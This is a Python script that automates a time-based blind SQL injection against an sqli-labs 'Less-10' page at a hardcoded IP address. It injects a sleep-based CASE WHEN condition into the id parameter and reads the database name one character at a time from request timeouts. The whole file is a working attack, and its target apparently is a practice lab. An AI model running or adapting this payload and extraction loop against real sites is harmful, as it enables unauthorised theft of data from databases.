import string

import requests

url = 'http://111.231.88.117/sqli_lab/sqli-labs-php7/Less-10/'
url += '?id=1\' and (select case when (substring((database()) from {0} for 1)=\'{1}\') then sleep(2) else 1 end)-- -'
mystring = string.printable

count = 1
result = ''
while (True):
    temp_result = result
    for char in mystring:
        try:
            response=requests.get(url.format(count,char),timeout=2)
        except requests.exceptions.ReadTimeout:
            result+=char
            print(result+'......')
            break
    if result==temp_result:
        print('result: '+result)
        break
    if '+++' in result:
        print('result: '+result[0:-3])
        break
    count+=1